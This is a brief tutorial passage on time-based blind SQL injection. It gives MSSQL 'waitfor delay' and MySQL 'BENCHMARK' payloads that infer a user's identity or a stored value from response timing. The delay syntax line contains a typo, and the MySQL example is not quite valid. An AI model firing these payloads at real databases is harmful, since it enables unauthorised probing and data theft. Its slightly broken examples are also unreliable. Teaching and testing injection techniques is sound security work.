# Time-Based Blind SQLi

Other technique for Blind SQLi is called Time-Based Blind SQLi, in which time is used to infer a TRUE or FALSE condition,

Syntax:

```text
%SQL condition% waitfor delay '0:0;5'
```

Examples:

```text
Check if the current user is 'sa' (MSSQL)
if (select user) = 'sa' waitfor delay '0:0:5'
```

```text
Guess a database value (MySQL) 
IF EXISTS (SELECT * FROM users WHERE username = 'armando') BENCHMARK(1000000,MD5(1))
```

Benchmark will perform md5\(1\) functions 1000000 times if the IF clause is true, consuming time. You should be careful with this because it can affect the server load.

